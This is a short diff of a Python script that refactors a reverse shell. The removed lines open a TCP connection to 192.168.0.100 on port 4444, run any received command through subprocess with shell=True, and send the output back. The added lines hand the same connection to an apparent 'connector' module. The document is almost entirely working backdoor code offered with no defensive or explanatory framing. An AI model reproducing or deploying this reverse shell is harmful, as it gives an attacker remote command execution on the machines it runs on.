@@ -1,13 +1,6 @@
 #!/usr/bin/env python
 
-import socket
-import subprocess
+import connector
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(("192.168.0.100", 4444))
-
-while True:
-    print("ON")
-    command = connection.recv(1024)
-    command_result = subprocess.check_output(command, shell=True)
-    connection.send(command_result)
+tcp_socket_connector = connector.Connector("192.168.0.100", 4444)
+tcp_socket_connector.run()
